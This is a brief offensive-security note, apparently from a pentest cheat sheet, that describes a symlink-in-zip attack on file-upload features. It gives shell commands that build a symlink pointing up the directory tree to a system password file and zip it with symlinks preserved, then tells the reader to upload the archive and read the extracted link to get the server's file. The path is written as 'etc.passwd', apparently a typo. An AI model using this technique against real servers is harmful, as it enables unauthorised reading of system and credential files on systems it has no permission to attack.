#lfi #file_upload

Create a symlink to a targeted file and zip it.
```bash
ln -s ../../../../../../../../etc.passwd malicious.txt
zip --symlinks malicious.zip malicious.txt
```

Then upload zip and access the decompressed file, it should open the file indicated by the link.
